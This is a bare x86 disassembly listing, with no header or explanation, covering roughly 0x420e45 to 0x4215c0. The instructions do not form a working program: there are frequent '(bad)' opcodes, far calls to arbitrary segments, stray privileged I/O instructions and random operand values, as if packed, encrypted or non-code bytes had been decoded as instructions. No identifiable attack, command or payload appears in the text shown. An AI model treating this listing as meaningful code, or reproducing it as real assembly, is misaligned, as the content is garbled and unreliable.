  420e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e46:	add    BYTE PTR [ebx+0x23],cl
  420e49:	or     BYTE PTR [ecx],al
  420e4b:	ins    DWORD PTR es:[edi],dx
  420e4c:	mov    bl,0x3a
  420e4e:	leave  
  420e4f:	and    al,bl
  420e51:	ja     0x420e51
  420e53:	adc    DWORD PTR [esi],ecx
  420e55:	mov    es,WORD PTR [edi]
  420e57:	in     al,0x10
  420e59:	(bad)  
  420e5d:	add    al,BYTE PTR [ebp+0x54]
  420e60:	sbb    eax,0x11be59f3
  420e65:	loop   0x420e8d
  420e67:	mov    ch,0x49
  420e69:	inc    edi
  420e6a:	hlt    
  420e6b:	dec    esp
  420e6c:	fs jns 0x420eca
  420e6f:	xchg   BYTE PTR ds:0x9157654a,al
  420e75:	pop    ds
  420e76:	sub    eax,0x60d98c7
  420e7b:	add    BYTE PTR [eax-0x7],bl
  420e7e:	cmp    cl,BYTE PTR [eax]
  420e80:	je     0x420e69
  420e82:	iret   
  420e83:	cmp    bh,BYTE PTR [ebx]
  420e85:	mov    bl,0x6a
  420e87:	adc    BYTE PTR [esp+esi*1],dh
  420e8a:	scas   eax,DWORD PTR es:[edi]
  420e8b:	pop    esi
  420e8c:	(bad)  
  420e8d:	dec    eax
  420e8e:	xchg   edx,eax
  420e8f:	xor    ebx,DWORD PTR [eax]
  420e91:	stc    
  420e92:	push   es
  420e93:	dec    ecx
  420e94:	mov    ah,0xf9
  420e96:	pop    es
  420e97:	add    al,0x5
  420e99:	pusha  
  420e9a:	jae    0x420e51
  420e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e9d:	jb     0x420f1a
  420e9f:	sub    eax,0x35dcace9
  420ea4:	ja     0x420e35
  420ea6:	(bad)  
  420ea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea8:	test   cl,0x10
  420eab:	mov    BYTE PTR [edi+edi*1+0x7da341b],dl
  420eb2:	jb     0x420eea
  420eb4:	add    bh,al
  420eb6:	(bad)  
  420eb7:	sbb    al,0x42
  420eb9:	mov    eax,0x6212c535
  420ebe:	xchg   edx,eax
  420ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ec0:	dec    eax
  420ec1:	mov    dl,0x82
  420ec3:	add    esi,DWORD PTR [edi+0x0]
  420ec6:	add    BYTE PTR [eax],al
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     bh,BYTE PTR [esi-0x20729fe8]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	add    DWORD PTR [esi],0x0
  420ee1:	add    BYTE PTR [esi+0xb],dl
  420ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ee5:	jle    0x420f5a
  420ee7:	test   al,0x93
  420ee9:	dec    edi
  420eea:	or     ah,dl
  420eec:	xchg   ecx,eax
  420eed:	dec    ebx
  420eee:	inc    eax
  420eef:	sahf   
  420ef0:	mov    cl,0xf5
  420ef2:	outs   dx,BYTE PTR ds:[si]
  420ef4:	scas   eax,DWORD PTR es:[edi]
  420ef5:	mov    esi,0xad99c5cb
  420efa:	sub    al,0xe2
  420efc:	push   ds
  420efd:	xor    eax,0xe472e756
  420f02:	neg    BYTE PTR ds:0xe2b6415b
  420f08:	arpl   WORD PTR [ebx],ax
  420f0a:	aam    0x73
  420f0c:	jne    0x420ee6
  420f0e:	ret    
  420f0f:	cs in  al,dx
  420f11:	mov    dl,0x15
  420f13:	ror    esp,0x63
  420f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f17:	mov    dl,0x23
  420f19:	ss and eax,0x51b6dca
  420f1f:	sti    
  420f20:	mov    cl,0xa9
  420f22:	data16 (bad) 
  420f24:	cmp    ebx,DWORD PTR [edx+0x47]
  420f27:	sub    dh,BYTE PTR [esi+edi*2-0x766dbaf6]
  420f2e:	test   BYTE PTR [eax+0x229989dd],ch
  420f34:	xchg   edx,eax
  420f35:	shl    BYTE PTR [edx-0x65a37792],1
  420f3b:	push   edi
  420f3c:	loop   0x420f2a
  420f3e:	cmp    esp,edx
  420f40:	sub    dl,BYTE PTR [ebp+0x7de874fe]
  420f46:	inc    edi
  420f47:	cld    
  420f48:	lods   ax,WORD PTR ds:[esi]
  420f4a:	xor    eax,0xf39693dc
  420f4f:	add    BYTE PTR [ecx],cl
  420f51:	inc    ecx
  420f52:	shl    BYTE PTR [ebp+0x43],0x28
  420f56:	jne    0x420f14
  420f58:	sub    esi,edx
  420f5a:	mov    dh,0x2b
  420f5c:	not    esp
  420f5e:	dec    ebp
  420f5f:	(bad)  
  420f60:	jmp    0x901a:0x868d2112
  420f67:	fild   DWORD PTR [edi]
  420f69:	call   0xe446:0x21172aa7
  420f70:	es push ds
  420f72:	mov    cl,0xc6
  420f74:	aad    0x33
  420f76:	sbb    al,0x5
  420f78:	dec    ebx
  420f79:	jae    0x420fbf
  420f7b:	or     BYTE PTR [ebp-0x48],ah
  420f7e:	cli    
  420f7f:	mov    dl,0xfc
  420f81:	leave  
  420f82:	aam    0xdc
  420f84:	mov    ebx,0xe478ddae
  420f89:	adc    dh,BYTE PTR [esi-0x39]
  420f8c:	and    BYTE PTR [esi-0x14],ah
  420f8f:	cmp    DWORD PTR ds:0x67c6dc49,ebp
  420f95:	sub    BYTE PTR [esi+ebp*2+0x4f],dh
  420f99:	js     0x420f4e
  420f9b:	dec    eax
  420f9c:	out    dx,al
  420f9d:	sbb    al,0xaa
  420f9f:	mov    cl,0xd3
  420fa1:	call   0xba59:0x2579c2c0
  420fa8:	fbstp  TBYTE PTR [ebp+0x44e5e0cc]
  420fae:	nop
  420faf:	mov    ah,0x4b
  420fb1:	in     al,0xeb
  420fb3:	xchg   edx,eax
  420fb4:	sub    DWORD PTR [esp+eax*2],ebx
  420fb7:	jl     0x421038
  420fb9:	ja     0x420fcd
  420fbb:	test   ecx,0x2ed663ad
  420fc1:	out    0x98,eax
  420fc3:	xor    dh,BYTE PTR [eax-0x6d]
  420fc6:	(bad)  
  420fc7:	adc    edx,DWORD PTR [ecx+0x16af9ff2]
  420fcd:	bound  ebp,QWORD PTR [esi+0x13]
  420fd0:	and    esi,DWORD PTR [ebx+0x34]
  420fd3:	push   es
  420fd4:	jae    0x420f9a
  420fd6:	xchg   ebx,eax
  420fd7:	dec    ebp
  420fd8:	dec    eax
  420fd9:	adc    al,0x8a
  420fdb:	and    ebx,DWORD PTR [ecx+0x1df09c78]
  420fe1:	call   0x82bc4fd1
  420fe6:	imul   ebp,DWORD PTR [esi],0xfffffff1
  420fe9:	mov    bh,0x2c
  420feb:	mov    gs,WORD PTR [ebx]
  420fed:	dec    edi
  420fee:	push   edi
  420fef:	sub    al,0x3c
  420ff1:	out    0xb6,eax
  420ff3:	push   0x35
  420ff5:	test   dh,al
  420ff7:	pop    edx
  420ff8:	xchg   BYTE PTR [eax],dl
  420ffa:	push   ds
  420ffb:	lahf   
  420ffc:	fidiv  WORD PTR ds:0xd1662fc4
  421002:	mul    edi
  421004:	xor    BYTE PTR [ebp+edi*4-0x72],ch
  421008:	jnp    0x421083
  42100a:	call   0xa008:0x3239f5d4
  421011:	pop    es
  421012:	jg     0x420fb1
  421014:	sub    al,0x4f
  421016:	mov    al,ds:0x12c2b6a9
  42101b:	ficom  DWORD PTR [edx-0x1c]
  42101e:	xchg   edi,eax
  42101f:	mov    ah,0x33
  421021:	aad    0x56
  421023:	mov    edx,0xf0840288
  421028:	sti    
  421029:	imul   ebx,DWORD PTR [ebp-0x22],0xffffffde
  42102d:	fs pop edx
  42102f:	addr16 mov bl,0xb9
  421032:	add    eax,0xc31b94b9
  421038:	push   ebp
  421039:	and    cl,BYTE PTR [edi-0x64558c01]
  42103f:	push   ebp
  421040:	xor    al,cl
  421042:	mov    ah,0xab
  421044:	mov    bl,bl
  421046:	das    
  421047:	xor    BYTE PTR [esi+0x395c3f49],ch
  42104d:	cmp    bh,BYTE PTR [edx-0x1c]
  421050:	test   eax,0x2f46ed83
  421055:	ja     0x42100d
  421057:	cli    
  421058:	loope  0x42109a
  42105a:	imul   ebp,DWORD PTR [edi-0x7e774bff],0xcfc45a14
  421064:	pusha  
  421065:	xchg   esp,eax
  421066:	mov    ch,0x84
  421068:	(bad)  
  421069:	ss popa 
  42106b:	push   es
  42106c:	fidivr DWORD PTR cs:[esi-0x16]
  421070:	and    ecx,eax
  421072:	or     DWORD PTR [edi+ebx*1-0x2a],ecx
  421076:	mov    ch,0x4b
  421078:	scas   al,BYTE PTR es:[edi]
  421079:	and    eax,0xeb18369e
  42107e:	fld    TBYTE PTR [edx-0x1c]
  421081:	pop    esp
  421082:	adc    bl,dl
  421084:	das    
  421085:	callw  0x69b9
  421089:	out    0x9a,eax
  42108b:	xor    bh,bh
  42108d:	adc    bh,dl
  42108f:	cwde   
  421090:	bound  edx,QWORD PTR [eax+0x6bc31c6c]
  421096:	xlat   BYTE PTR ds:[ebx]
  421097:	dec    ebp
  421098:	cmp    DWORD PTR [edi-0x355d225],0xfffffff1
  42109f:	in     eax,0x68
  4210a1:	sbb    eax,DWORD PTR [eax-0x79]
  4210a4:	jmp    0xf9219240
  4210a9:	mov    ah,0xed
  4210ab:	cmp    ebx,ecx
  4210ad:	daa    
  4210ae:	mov    DWORD PTR [ecx+0x238a5ad],ecx
  4210b4:	cmp    ecx,DWORD PTR ds:0x888cedf3
  4210ba:	les    esp,FWORD PTR [ebx]
  4210bc:	stc    
  4210bd:	out    dx,eax
  4210be:	arpl   WORD PTR [esi+0x58],cx
  4210c1:	and    dh,bh
  4210c3:	addr16 mov ds:0x698e,al
  4210c7:	jp     0x4210b2
  4210c9:	inc    ebp
  4210ca:	stc    
  4210cb:	retf   
  4210cc:	stos   BYTE PTR es:[edi],al
  4210cd:	or     ebp,DWORD PTR [ebp-0x56b65bf4]
  4210d3:	(bad)  
  4210d4:	lock xor BYTE PTR [ebp+0x7a],al
  4210d8:	mov    eax,ds:0x484dbc4
  4210dd:	sbb    eax,0x455a974b
  4210e2:	xchg   ebp,eax
  4210e3:	fisubr DWORD PTR [esi+0x1d667c3c]
  4210e9:	cmp    ch,ch
  4210eb:	mov    ds:0xf1bb4fca,al
  4210f0:	ins    BYTE PTR es:[edi],dx
  4210f1:	pop    edx
  4210f2:	xor    al,0x4b
  4210f4:	outs   dx,DWORD PTR ds:[esi]
  4210f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210f6:	in     al,dx
  4210f7:	fisub  WORD PTR [ebp-0x25743c29]
  4210fd:	dec    esi
  4210fe:	fistp  QWORD PTR [edi]
  421100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421101:	cmp    BYTE PTR [esi-0x730a33f2],cl
  421107:	icebp  
  421108:	jb     0x42114f
  42110a:	jmp    0x3011:0x59a5d096
  421111:	cmc    
  421112:	adc    ebp,esp
  421114:	mov    cs,WORD PTR [eax+0x1073fd0f]
  42111a:	gs iret 
  42111c:	sub    bl,al
  42111e:	jno    0x421118
  421120:	scas   al,BYTE PTR es:[edi]
  421121:	jecxz  0x42113c
  421123:	pop    ss
  421124:	daa    
  421125:	pop    ds
  421126:	imul   esp,DWORD PTR [edi+0x49],0xa5837726
  42112d:	call   0x4329:0x6c988188
  421134:	aaa    
  421135:	shr    BYTE PTR [edi],1
  421137:	sub    eax,0x4b994fda
  42113c:	sahf   
  42113d:	inc    esi
  42113e:	jl     0x42114e
  421140:	dec    esi
  421141:	adc    al,cl
  421143:	sbb    bl,BYTE PTR [ecx-0x3512ffa9]
  421149:	jle    0x421169
  42114b:	es repz adc BYTE PTR ds:[edi+0x53],0x10
  421152:	repz inc esi
  421154:	adc    ebx,DWORD PTR [esi]
  421156:	xor    al,0x1b
  421158:	sbb    al,BYTE PTR [edx-0x5e]
  42115b:	fnstenv [ecx+0x64214e97]
  421161:	jb     0x421101
  421163:	clc    
  421164:	cmp    eax,0xfcdeb1d4
  421169:	xchg   ecx,eax
  42116a:	cs dec esi
  42116c:	adc    al,BYTE PTR [ebx-0xc]
  42116f:	pop    esp
  421170:	mov    bl,0xdc
  421172:	ror    DWORD PTR [edx-0x3b],0xd4
  421176:	pop    edx
  421177:	or     DWORD PTR [ebx+ebx*1],0x326394c4
  42117e:	hlt    
  42117f:	cmp    BYTE PTR [eax+edx*4],dh
  421182:	mov    dl,BYTE PTR [ebx]
  421184:	xchg   ebp,eax
  421185:	cmp    DWORD PTR [eax-0x74630cd1],edi
  42118b:	or     BYTE PTR [eax+eiz*1+0x14fc0736],dh
  421192:	add    DWORD PTR [ebx],0xb100b9ea
  421198:	pop    es
  421199:	sbb    eax,0xe5c47d55
  42119e:	outs   dx,DWORD PTR ds:[esi]
  42119f:	adc    al,0x96
  4211a1:	and    cl,BYTE PTR [esi-0x80]
  4211a4:	inc    esi
  4211a5:	fs inc ebx
  4211a7:	inc    esi
  4211a8:	mov    edi,DWORD PTR [edi-0x3a1ab50d]
  4211ae:	out    dx,eax
  4211af:	push   cs
  4211b0:	popf   
  4211b1:	xor    al,0x63
  4211b3:	dec    esp
  4211b4:	adc    cl,BYTE PTR [ebp+0x30]
  4211b7:	xor    ebx,DWORD PTR [edx+eiz*1]
  4211ba:	inc    eax
  4211bb:	and    esi,DWORD PTR [bp-0x5b]
  4211bf:	nop
  4211c0:	popf   
  4211c1:	sbb    eax,0xb70b432a
  4211c6:	icebp  
  4211c7:	mov    ds:0xf8e07eb3,eax
  4211cc:	push   edi
  4211cd:	push   edi
  4211ce:	(bad)  
  4211cf:	pop    ecx
  4211d0:	jge    0x421242
  4211d2:	dec    ebx
  4211d3:	fistp  QWORD PTR [esi+0x1e]
  4211d6:	jbe    0x421190
  4211d8:	gs sub al,0xab
  4211db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211dc:	push   es
  4211dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211de:	add    eax,DWORD PTR [edx-0x53]
  4211e1:	mov    edi,0xed19e266
  4211e6:	dec    DWORD PTR [edi]
  4211e8:	stos   BYTE PTR es:[edi],al
  4211e9:	sub    ebp,esi
  4211eb:	rcr    BYTE PTR [esp+esi*2-0x7d],cl
  4211ef:	mov    al,ds:0x666c547b
  4211f4:	sub    BYTE PTR [ebx],dh
  4211f6:	pop    eax
  4211f7:	ins    BYTE PTR es:[edi],dx
  4211f8:	pop    edx
  4211f9:	inc    esp
  4211fa:	std    
  4211fb:	jbe    0x421222
  4211fd:	lods   al,BYTE PTR ds:[esi]
  4211fe:	clc    
  4211ff:	mov    dh,0x7b
  421201:	adc    ah,ah
  421203:	push   edx
  421204:	fcomp  DWORD PTR [ebx-0x58]
  421207:	popa   
  421208:	ror    BYTE PTR [eax],0x3f
  42120b:	cdq    
  42120c:	xor    ebx,DWORD PTR [ecx-0x6ebc0faf]
  421212:	inc    eax
  421213:	outs   dx,DWORD PTR ds:[esi]
  421214:	push   ebx
  421215:	js     0x4211f6
  421217:	pop    edx
  421218:	leave  
  421219:	jno    0x4211cb
  42121b:	scas   al,BYTE PTR es:[edi]
  42121c:	inc    ebx
  42121d:	in     al,dx
  42121e:	or     DWORD PTR [ecx+0x31],esi
  421221:	clc    
  421222:	sbb    ebx,DWORD PTR [edi+0x4b]
  421225:	rol    BYTE PTR [edi+0x1ce1c1c5],0xce
  42122c:	jb     0x421298
  42122e:	sar    DWORD PTR [edx],0x6f
  421231:	aam    0xa5
  421233:	xchg   edi,eax
  421234:	pop    eax
  421235:	stos   DWORD PTR es:[edi],eax
  421236:	cmp    eax,0xb1c3385a
  42123b:	or     edx,DWORD PTR [ecx]
  42123d:	xor    ch,bl
  42123f:	shl    BYTE PTR [ecx],1
  421241:	and    ah,cl
  421243:	mov    esi,0x534e5ea8
  421248:	(bad)  
  421249:	mov    bh,0xb6
  42124b:	push   eax
  42124c:	and    eax,0x68b79284
  421251:	ja     0x4211fe
  421253:	jbe    0x421265
  421255:	popa   
  421256:	aam    0xa1
  421258:	rcr    DWORD PTR [ecx-0x1e51fe1c],0x6d
  42125f:	hlt    
  421260:	pushf  
  421261:	mov    esi,0xe6d63c8b
  421266:	aad    0xf4
  421268:	jmp    0x7a00cd85
  42126d:	cmp    esp,DWORD PTR [eax+0x63]
  421270:	sub    BYTE PTR [edx],dh
  421272:	mov    esi,0xc287252e
  421277:	cmp    esp,edi
  421279:	and    eax,0x1dcc91e6
  42127e:	jo     0x4212e3
  421280:	pop    ebx
  421281:	ret    
  421282:	push   ds
  421283:	fdivr  DWORD PTR [edi-0x54]
  421286:	test   eax,0x897736c1
  42128b:	call   0xe7f7:0x650d583a
  421292:	jmp    0xe09d975c
  421297:	repnz mov ds:0x59b7a586,eax
  42129d:	push   0x530244fd
  4212a2:	jecxz  0x421263
  4212a4:	stc    
  4212a5:	loope  0x421283
  4212a7:	push   ds
  4212a8:	pushf  
  4212a9:	mov    esp,0xd6442a9
  4212ae:	aas    
  4212af:	or     bl,BYTE PTR [esi]
  4212b1:	and    al,0x2d
  4212b3:	push   ebx
  4212b4:	adc    BYTE PTR [ecx],dh
  4212b6:	xchg   esp,eax
  4212b7:	test   al,0x54
  4212b9:	mov    DWORD PTR [esi+edx*8],esp
  4212bc:	and    al,0x6a
  4212be:	mov    ebx,edx
  4212c0:	ss daa 
  4212c2:	or     al,0xca
  4212c4:	adc    eax,0x782e962
  4212c9:	xlat   BYTE PTR ds:[ebx]
  4212ca:	stos   DWORD PTR es:[edi],eax
  4212cb:	inc    edi
  4212cc:	mov    ebx,0x7e2e1c82
  4212d1:	scas   al,BYTE PTR es:[edi]
  4212d2:	aas    
  4212d3:	add    eax,0x45934885
  4212d8:	ret    
  4212d9:	pop    ds
  4212da:	pop    eax
  4212db:	inc    ebp
  4212dc:	loop   0x421272
  4212de:	sbb    al,0xe1
  4212e0:	or     ebx,DWORD PTR [ebx-0x42]
  4212e3:	mov    fs,edi
  4212e5:	out    dx,al
  4212e6:	cwde   
  4212e7:	dec    esi
  4212e8:	pop    esi
  4212e9:	xor    DWORD PTR [ebx],edi
  4212eb:	jbe    0x421347
  4212ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212ee:	test   al,0x9
  4212f0:	in     al,dx
  4212f1:	adc    BYTE PTR [esi+0x41],cl
  4212f4:	xchg   edi,eax
  4212f5:	jb     0x4212dd
  4212f7:	inc    esp
  4212f8:	das    
  4212f9:	(bad)  
  4212fa:	push   ecx
  4212fb:	arpl   WORD PTR [ebx],ax
  4212fd:	dec    edi
  4212fe:	mov    cl,0xf5
  421300:	popa   
  421301:	(bad)  
  421302:	shl    eax,0x92
  421305:	popf   
  421306:	xchg   esp,eax
  421307:	add    BYTE PTR [ecx+0x420c290a],cl
  42130d:	stos   DWORD PTR es:[edi],eax
  42130e:	or     ebx,ecx
  421310:	mov    eax,ds:0xf0c632d9
  421315:	push   edi
  421316:	dec    esp
  421317:	push   ss
  421318:	xchg   esi,eax
  421319:	mov    eax,ds:0x47cc82e2
  42131e:	mov    fs,eax
  421320:	(bad)  
  421321:	mov    esi,0x6b888448
  421326:	btc    DWORD PTR [ebx-0x769ea97a],esi
  42132d:	or     al,0xed
  42132f:	fsub   DWORD PTR [ebp+0x1a]
  421332:	jae    0x421313
  421334:	inc    ebx
  421335:	mov    DWORD PTR [ebx-0x54],0x380c0750
  42133c:	push   cs
  42133d:	(bad)  
  42133e:	shr    BYTE PTR [edx],0x8c
  421341:	jmp    0x7ba078ea
  421346:	adc    DWORD PTR [ebx-0x794fc36f],ebp
  42134c:	mov    ah,0x1f
  42134e:	add    BYTE PTR [eax+ecx*8+0x64f7ef85],bl
  421355:	push   esi
  421356:	scas   eax,DWORD PTR es:[edi]
  421357:	push   esi
  421358:	lods   al,BYTE PTR ds:[esi]
  421359:	into   
  42135a:	mov    ebx,0x4b35c79
  42135f:	scas   al,BYTE PTR es:[edi]
  421360:	pop    ecx
  421361:	xchg   ebp,eax
  421362:	stos   BYTE PTR es:[edi],al
  421363:	mov    esi,ebx
  421365:	pop    edi
  421366:	jge    0x421326
  421368:	mul    BYTE PTR [ebx+edi*8]
  42136b:	lds    edi,FWORD PTR [edi-0x1c]
  42136e:	nop
  42136f:	mov    al,ds:0x33e7f459
  421374:	sbb    al,0xe8
  421376:	add    ebp,DWORD PTR [ecx+ecx*1+0x382ba9c9]
  42137d:	xchg   ebp,eax
  42137e:	test   BYTE PTR [edx],dl
  421380:	aas    
  421381:	(bad)  
  421382:	xchg   esp,eax
  421383:	out    dx,al
  421384:	mov    cs,WORD PTR ds:[esi+0x7e]
  421388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421389:	fsub   st,st(1)
  42138b:	int    0x10
  42138d:	xchg   ecx,eax
  42138e:	adc    bh,BYTE PTR [esi]
  421390:	push   cs
  421391:	sti    
  421392:	daa    
  421393:	(bad)  
  421394:	push   esp
  421395:	daa    
  421396:	ins    DWORD PTR es:[edi],dx
  421397:	aas    
  421398:	iret   
  421399:	in     al,dx
  42139a:	ror    BYTE PTR [ecx-0x4f],cl
  42139d:	scas   al,BYTE PTR es:[edi]
  42139e:	stc    
  42139f:	ds jnp 0x4213df
  4213a2:	mov    al,0xa9
  4213a4:	inc    eax
  4213a5:	es out 0xdd,al
  4213a8:	adc    dh,BYTE PTR [eax]
  4213aa:	jg     0x4213f1
  4213ac:	iret   
  4213ad:	test   bl,dl
  4213af:	mov    ebx,0x6433e8e4
  4213b4:	ror    BYTE PTR [ecx+0x7c],cl
  4213b7:	cld    
  4213b8:	and    DWORD PTR [edi+ecx*2],ecx
  4213bb:	mov    edi,0xa42dcc0a
  4213c0:	xor    al,0x10
  4213c2:	cdq    
  4213c3:	pop    ds
  4213c4:	pop    edi
  4213c5:	dec    esi
  4213c6:	xchg   edx,eax
  4213c7:	xchg   esi,eax
  4213c8:	pop    esi
  4213c9:	mov    ebx,0x24b5f217
  4213ce:	adc    DWORD PTR [ebp+0x66d0a71a],0x16
  4213d5:	push   es
  4213d6:	ja     0x421361
  4213d8:	into   
  4213d9:	sahf   
  4213da:	or     BYTE PTR [ebx+0x69a35236],dh
  4213e0:	bound  edi,QWORD PTR [ebx+0x5981dab7]
  4213e6:	out    0x5d,eax
  4213e8:	enter  0x7c6c,0x14
  4213ec:	pop    edx
  4213ed:	hlt    
  4213ee:	les    edi,FWORD PTR [eax+ebx*2+0x265491ef]
  4213f5:	(bad)  
  4213f6:	addr16 (bad) 
  4213f8:	in     eax,dx
  4213f9:	and    ch,BYTE PTR ss:[eax]
  4213fc:	inc    ebp
  4213fd:	inc    esp
  4213fe:	mov    esp,0x6228cd81
  421403:	jp     0x4213fb
  421405:	pop    ebp
  421406:	inc    edx
  421407:	in     eax,0x48
  421409:	sbb    BYTE PTR [edx-0x4d],dh
  42140c:	cmp    eax,DWORD PTR [eax+0x5f]
  42140f:	loop   0x42139b
  421411:	scas   al,BYTE PTR es:[edi]
  421412:	inc    edi
  421413:	int    0x5e
  421415:	inc    eax
  421416:	clc    
  421417:	lods   al,BYTE PTR ds:[esi]
  421418:	gs mov ah,0xcf
  42141b:	mov    ch,0x7e
  42141d:	mov    DWORD PTR [ebx-0x129d0e91],ebx
  421423:	ja     0x4213ba
  421425:	cld    
  421426:	enter  0xd676,0x33
  42142a:	inc    esi
  42142b:	cmp    al,0xfd
  42142d:	mov    ch,BYTE PTR [ebx+eiz*2]
  421430:	or     eax,0xa510e020
  421435:	in     al,dx
  421436:	sbb    BYTE PTR [esi+0x1b209ca5],ch
  42143c:	xchg   ebx,eax
  42143d:	aaa    
  42143e:	std    
  42143f:	daa    
  421440:	pop    ss
  421441:	xchg   DWORD PTR [eax+0x7a],eax
  421444:	rcr    BYTE PTR [esi],1
  421446:	or     al,0x1f
  421448:	addr16 cdq 
  42144a:	into   
  42144b:	mov    ebx,0xe57ecd71
  421450:	ins    BYTE PTR es:[edi],dx
  421451:	lahf   
  421452:	jge    0x4213e3
  421454:	and    DWORD PTR [edx+0x70],0xffffffbe
  421458:	cmp    dh,BYTE PTR [edx+0x1]
  42145b:	or     ah,bh
  42145d:	sbb    bl,BYTE PTR [eax+0x24]
  421460:	jae    0x42143d
  421462:	gs ja  0x4213ec
  421465:	push   0xffffffec
  421467:	test   edi,edx
  421469:	sub    BYTE PTR [eax],bh
  42146b:	test   eax,0x8672d17
  421470:	(bad)  
  421471:	xor    al,BYTE PTR [ebx-0x68]
  421474:	popf   
  421475:	mov    dh,0xde
  421477:	inc    esp
  421478:	xor    BYTE PTR [ecx],cl
  42147a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42147b:	dec    esi
  42147c:	mov    bl,0xc9
  42147e:	push   ebp
  42147f:	jb     0x421402
  421481:	nop
  421482:	retf   
  421483:	(bad)  
  421484:	mov    ch,0x68
  421486:	and    al,0x6
  421488:	xor    ebx,DWORD PTR [ecx-0x6]
  42148b:	mov    ds:0x36018443,eax
  421490:	pop    ebp
  421491:	sub    DWORD PTR [edx+0x2e929f3d],ebx
  421497:	dec    esi
  421498:	imul   esi,DWORD PTR [edi],0x246f6fd2
  42149e:	pop    ds
  42149f:	aad    0xe4
  4214a1:	jecxz  0x421477
  4214a3:	ret    0xe601
  4214a6:	jno    0x421500
  4214a8:	jl     0x4214bf
  4214aa:	cmp    ecx,DWORD PTR [eax+0x30]
  4214ad:	mov    esp,0xc1f6459
  4214b2:	mov    ds:0x683ccc0a,eax
  4214b7:	cmp    eax,0x1bc6edc5
  4214bc:	and    ebp,ecx
  4214be:	xor    BYTE PTR [ecx],dh
  4214c0:	clc    
  4214c1:	push   ds
  4214c2:	into   
  4214c3:	data16 mov BYTE PTR [ecx+0x6001b474],0x75
  4214cb:	fwait
  4214cc:	icebp  
  4214cd:	es xchg ecx,eax
  4214cf:	or     BYTE PTR [ebp+0x1a],cl
  4214d2:	neg    DWORD PTR [edx+0x3b]
  4214d5:	shr    eax,0xa3
  4214d8:	or     eax,0x775ad06f
  4214dd:	and    eax,0x362b7814
  4214e2:	dec    edx
  4214e3:	(bad)  
  4214e4:	lea    ebp,ds:0x6d761a4e
  4214ea:	and    BYTE PTR [ecx],al
  4214ec:	fwait
  4214ed:	xor    eax,0x2bd1ff06
  4214f2:	xchg   ecx,eax
  4214f3:	cmp    eax,DWORD PTR [ebx+eiz*4]
  4214f6:	popf   
  4214f7:	popa   
  4214f8:	sub    al,0x52
  4214fa:	lahf   
  4214fb:	call   0x172f:0xb3d3eebf
  421502:	test   BYTE PTR [esi+esi*8],cl
  421505:	push   eax
  421506:	jecxz  0x421527
  421508:	call   0x8c6a1b5a
  42150d:	pop    esi
  42150e:	ror    DWORD PTR [edx-0x4e756dcb],cl
  421514:	popf   
  421515:	xchg   esi,eax
  421516:	push   cs
  421517:	int    0xa5
  421519:	mov    BYTE PTR [edx+0x19cac34d],ah
  42151f:	jns    0x421567
  421521:	cli    
  421522:	inc    DWORD PTR [esi+0x7950eca9]
  421528:	ins    BYTE PTR es:[edi],dx
  421529:	aad    0x24
  42152b:	and    al,0xe0
  42152d:	btc    DWORD PTR [edi-0x43],0x9e
  421532:	stos   BYTE PTR es:[edi],al
  421533:	es jl  0x421513
  421536:	sbb    BYTE PTR [edx],ch
  421538:	jp     0x4215b9
  42153a:	ins    DWORD PTR es:[edi],dx
  42153b:	pop    esi
  42153c:	fstp   TBYTE PTR [ecx]
  42153e:	and    ebx,DWORD PTR [edi-0x1742c657]
  421544:	std    
  421545:	retf   
  421546:	push   edx
  421547:	(bad)  
  421548:	aas    
  421549:	ret    
  42154a:	or     DWORD PTR [ecx],esp
  42154c:	push   ebx
  42154d:	dec    ebp
  42154e:	pop    ebx
  42154f:	outs   dx,DWORD PTR ds:[esi]
  421550:	push   es
  421551:	xor    al,0xed
  421553:	mov    ecx,0x6cfb3c9d
  421558:	mov    al,0x74
  42155a:	sti    
  42155b:	sti    
  42155c:	test   al,0xa
  42155e:	push   ds
  42155f:	sbb    DWORD PTR [edx],edi
  421561:	dec    edx
  421562:	mov    eax,ds:0x52db
  421567:	add    BYTE PTR [eax],al
  421569:	add    BYTE PTR [edi+0x5a],dl
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x84640bb5
  421579:	sub    al,0x62
  42157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42157c:	add    DWORD PTR [eax],eax
  42157e:	add    DWORD PTR [esi],0x0
  421581:	add    BYTE PTR [esi+0x2a26e4e0],dl
  421587:	xor    ebp,DWORD PTR [ebx+0x58d8bff5]
  42158d:	xchg   ecx,eax
  42158e:	lods   eax,DWORD PTR ds:[esi]
  42158f:	adc    eax,0x3d3e2472
  421594:	mov    ch,0xa7
  421596:	mov    dl,0xf0
  421598:	mov    cl,BYTE PTR [ecx-0x6]
  42159b:	(bad)  
  42159c:	js     0x42153d
  42159e:	xor    BYTE PTR [edi+0x205a9486],cl
  4215a4:	jge    0x4215d1
  4215a6:	mov    DWORD PTR [esi+eiz*2+0x25],eax
  4215aa:	dec    ecx
  4215ab:	pop    ecx
  4215ac:	cmp    DWORD PTR [ecx-0x382a9d50],esi
  4215b2:	and    dh,BYTE PTR [edi+0x4d]
  4215b5:	mov    dl,0x63
  4215b7:	and    BYTE PTR ds:0xcbf7be1b,dl
  4215bd:	push   edx
  4215be:	ss dec edi
  4215c0:	sbb    eax,0xd0a06aad
